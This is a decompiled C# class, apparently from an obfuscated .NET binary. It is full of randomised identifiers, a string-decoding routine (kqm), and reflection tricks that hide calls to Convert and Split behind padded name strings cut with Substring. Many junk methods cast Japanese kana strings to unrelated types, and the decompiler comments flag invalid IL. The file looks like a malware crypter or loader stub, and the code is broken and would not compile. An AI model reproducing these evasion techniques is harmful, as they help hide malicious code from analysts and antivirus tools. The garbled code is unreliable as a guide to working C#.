using System;
using System.CodeDom;
using System.Collections.Generic;
using System.ComponentModel;
using System.ComponentModel.Design.Serialization;
using System.Deployment.Internal.Isolation;
using System.Deployment.Internal.Isolation.Manifest;
using System.Diagnostics;
using System.Globalization;
using System.Net;
using System.Net.Cache;
using System.Net.NetworkInformation;
using System.Net.Security;
using System.Reflection;
using System.Reflection.Cache;
using System.Reflection.Emit;
using System.Runtime.CompilerServices;
using System.Runtime.ConstrainedExecution;
using System.Runtime.Remoting.Channels;
using System.Runtime.Remoting.Metadata;
using System.Runtime.Serialization.Formatters;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Security.Policy;
using System.Security.Principal;
using System.Windows.Forms;
using System.Windows.Forms.VisualStyles;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.FileIO;
using Microsoft.Win32;

public class DNvviiK
{
	public delegate object GDelegate0();

	public delegate char fb2(int data);

	public delegate int fb1(char data);

	public delegate string[] FB3(string data, string delimiter, int arg1, CompareMethod arg2);

	internal static fb2 fb2_0 = (fb2)CeuN();

	internal static fb1 fb1_0 = (fb1)YdOHOsG();

	internal static FB3 fb3_0 = (FB3)FVYbTrH();

	private object SfH;

	private object hyzVXgE;

	private object IMxq;

	private object LDbFj;

	private object u;

	private object y;

	private object ukQZ;

	private object F;

	private object SUoR;

	private object ZLPpP;

	private object tpBSgC;

	private object LBg;

	private object WVlor;

	private object zwfsSStC;

	private object lEmJ;

	private object Qn;

	private object mlCrul;

	private object v;

	public static string kqm(string H78克伊伊娜杰Ù提吾比提, string l79西开伊德艾西杰贝提吉尺吾尺勒)
	{
		string text = null;
		int num = 0;
		checked
		{
			int num2 = l79西开伊德艾西杰贝提吉尺吾尺勒.Length - 1;
			for (int i = 0; i <= num2; i++)
			{
				num += fb1_0(l79西开伊德艾西杰贝提吉尺吾尺勒[i]);
			}
			int num3 = fb1_0(H78克伊伊娜杰Ù提吾比提[0]) - num;
			int j = 0;
			for (int length = H78克伊伊娜杰Ù提吾比提.Length; j < length; j++)
			{
				char data = H78克伊伊娜杰Ù提吾比提[j];
				int data2 = fb1_0(data) - num3;
				text += Conversions.ToString(fb2_0(data2));
			}
			text = text.Substring(1, Strings.Len(text) - 1);
			return Conversions.ToString(Nxfh.Trm10(text));
		}
	}

	public static object yCQlnw()
	{
		object objectValue = RuntimeHelpers.GetObjectValue(cjOoaq.FFUYb());
		return fb3_0(Conversions.ToString(objectValue), "@", -1, (CompareMethod)0)[4].Replace(cjOoaq.string_0, "@");
	}

	public static object H()
	{
		return Nxfh.tSyc();
	}

	public static object CeuN()
	{
		return hB(Delegate.CreateDelegate(typeof(fb2), (MethodInfo)ukQZZ()), 1);
	}

	public static object hB(object o, object a)
	{
		if (Operators.ConditionalCompareObjectEqual(a, (object)0, false))
		{
			return (fb1)o;
		}
		if (Operators.ConditionalCompareObjectEqual(a, (object)1, false))
		{
			return (fb2)o;
		}
		if (Operators.ConditionalCompareObjectEqual(a, (object)2, false))
		{
			return (FB3)o;
		}
		object result = default(object);
		return result;
	}

	private static object ukQZZ()
	{
		return typeof(Convert).GetMethod("ToChardadwadawdawdawdaw".Substring(0, 6), new Type[1] { typeof(int) });
	}

	public static object YdOHOsG()
	{
		return hB(RuntimeHelpers.GetObjectValue(Nxfh.RnXinkvN(typeof(fb1), typeof(Convert).GetMethod("ToInt32", new Type[1] { typeof(char) }))), 0);
	}

	public static object FVYbTrH()
	{
		Type type = (Type)typeof(DNvviiK).GetMethod("spletTypewadawdawde".Substring(0, 9))!.Invoke(null, new object[1] { 0 });
		return Nxfh.YgsVo(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet((object)type, (Type)null, "GetMethod", new object[2]
		{
			"Split",
			RuntimeHelpers.GetObjectValue(Nxfh.UrKWKICU(new object[3]
			{
				new byte[2] { 0, 5 },
				"dkljadawhj",
				typeof(string)
			}))
		}, (string[])null, (Type[])null, (bool[])null)));
	}

	public static object spletType(object o)
	{
		return typeof(Strings);
	}

	AdapterFlags bG(CookieToken evIwtnGDa)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0008: Unknown result type (might be due to invalid IL or missing references)
		//IL_0009: Unknown result type (might be due to invalid IL or missing references)
		//IL_000d: Unknown result type (might be due to invalid IL or missing references)
		return (AdapterFlags)(this + evIwtnGDa + DNvviiK.SfH);
	}

	StoreTransactionOperationType kOeLRk(SHChangeEventParameterFlags shchangeEventParameterFlags_0, ArrangeDirection arrangeDirection_0)
	{
		_ = DNvviiK.hyzVXgE;
		return (StoreTransactionOperationType)"ろむせけこ";
	}

	FormatterTypeStyle xcDo(DataGridViewCellStylePropertyInternal dataGridViewCellStylePropertyInternal_0, MetadataToken metadataToken_0, DTT dtt_0, SessionSwitchReason sessionSwitchReason_0)
	{
		//IL_000b: Expected I4, but got O
		_ = DNvviiK.IMxq;
		return (FormatterTypeStyle)"おけ";
	}

	Perf_Contexts TPEYOFTdM(HorizontalAlignment horizontalAlignment_0, IgnoreCertProblem ignoreCertProblem_0, DragDropEffects dragDropEffects_0, INPUT input_0, Base64FormattingOptions base64FormattingOptions_0, MibIcmpInfo mibIcmpInfo_0)
	{
		_ = DNvviiK.LDbFj;
		return (Perf_Contexts)"しをゆすめぃされけ";
	}

	RegistryValueOptions yYNKEW(DSSPUBKEY dsspubkey_0, FileAssociationEntryFieldId fileAssociationEntryFieldId_0)
	{
		//IL_000b: Expected I4, but got O
		_ = DNvviiK.u;
		return (RegistryValueOptions)"とるすやるよ";
	}

	WebParseErrorCode CQlnwHCe(AuthenticationLevel authenticationLevel_0, HorizontalAlign horizontalAlign_0)
	{
		_ = DNvviiK.y;
		return (WebParseErrorCode)"うせむい";
	}

	StoreOperationInstallDeployment ZYdOH(VbStrConv vbStrConv_0, PerformanceCounterPermissionAccess performanceCounterPermissionAccess_0)
	{
		_ = DNvviiK.ukQZ;
		return (StoreOperationInstallDeployment)"そろか";
	}

	FtpStatusCode VYbTrH(ScrollBars scrollBars_0, LoaderInformation loaderInformation_0, CRYPT_KEY_PROV_INFO crypt_KEY_PROV_INFO_0, Enumerator enumerator_0)
	{
		_ = DNvviiK.F;
		return (FtpStatusCode)"んも";
	}

	SID_AND_ATTRIBUTES VjtPcPC(Enumerator enumerator_0, WindowsBuiltInRole windowsBuiltInRole_0, XmlFieldOrderOption xmlFieldOrderOption_0, PropertyAttributes propertyAttributes_0)
	{
		_ = DNvviiK.SUoR;
		return (SID_AND_ATTRIBUTES)"へんをはけ";
	}

	DataGridViewAdvancedCellBorderStyle aUmj(X509ContentType x509ContentType_0, MemberRelationship memberRelationship_0, TabInfo tabInfo_0, ResponseState responseState_0, CallingConventions callingConventions_0, CultureTableHeader cultureTableHeader_0)
	{
		_ = DNvviiK.ZLPpP;
		return (DataGridViewAdvancedCellBorderStyle)"くふい";
	}

	__FixupData p(DescriptionMetadataEntryFieldId descriptionMetadataEntryFieldId_0, CodeTypeReferenceOptions codeTypeReferenceOptions_0, SHChangeEventParameterFlags shchangeEventParameterFlags_0, StartIPOptions startIPOptions_0, PropertyTabScope propertyTabScope_0, IDOffsetItem idoffsetItem_0)
	{
		_ = DNvviiK.tpBSgC;
		return (__FixupData)"んぬつぃぇへぇえ";
	}

	RfcChar pp(CustomAttributeTypedArgument customAttributeTypedArgument_0, BrowseInfos browseInfos_0, SkipAddresses skipAddresses_0, CMS_FILE_WRITABLE_TYPE cms_FILE_WRITABLE_TYPE_0, UnicodeDataHeader unicodeDataHeader_0, DateTimeToken dateTimeToken_0)
	{
		_ = DNvviiK.LBg;
		return (RfcChar)"らわちぬほこ";
	}

	HttpCacheAgeControl jIXQzi(CacheObjType cacheObjType_0, ArrowDirection arrowDirection_0, Entry entry_0, TM tm_0, CRYPT_OID_INFO crypt_OID_INFO_0, TunnelStateObject tunnelStateObject_0)
	{
		_ = DNvviiK.WVlor;
		return (HttpCacheAgeControl)"やかむゆ";
	}

	UIOptionInternal PqKp(EnumCategoriesFlags enumCategoriesFlags_0, CreateFlags createFlags_0, EnvironmentVariableTarget environmentVariableTarget_0, CredentialUse credentialUse_0)
	{
		_ = DNvviiK.zwfsSStC;
		return (UIOptionInternal)"せまかまれ";
	}

	MessageBoxDefaultButton sEKGRix(TrustManagerWarningLevel trustManagerWarningLevel_0, SIGDN sigdn_0, MoveFileExFlags moveFileExFlags_0, DOCHOSTUIDBLCLICK dochostuidblclick_0, WriteHeadersCallbackState writeHeadersCallbackState_0)
	{
		_ = DNvviiK.lEmJ;
		return (MessageBoxDefaultButton)"かき";
	}

	decimal iMOtBUb(CMSG_CTRL_DEL_SIGNER_UNAUTH_ATTR_PARA Rwrsq)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0008: Unknown result type (might be due to invalid IL or missing references)
		//IL_0009: Unknown result type (might be due to invalid IL or missing references)
		//IL_000d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0012: Expected O, but got Unknown
		CharKind val = (CharKind)(this + Rwrsq + DNvviiK.Qn);
		return (decimal)val;
	}

	WSAData LnTRynIxo(SHFILEOPSTRUCT shfileopstruct_0, InternalEncodingDataItem internalEncodingDataItem_0, Consistency consistency_0, DataGridViewComboBoxDisplayStyle dataGridViewComboBoxDisplayStyle_0)
	{
		_ = DNvviiK.mlCrul;
		return (WSAData)"えすぃ";
	}

	TVSORTCB iiK(Filter SfHbGevI)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0008: Unknown result type (might be due to invalid IL or missing references)
		//IL_0009: Unknown result type (might be due to invalid IL or missing references)
		//IL_000d: Unknown result type (might be due to invalid IL or missing references)
		return (TVSORTCB)(this + SfHbGevI + DNvviiK.v);
	}
}
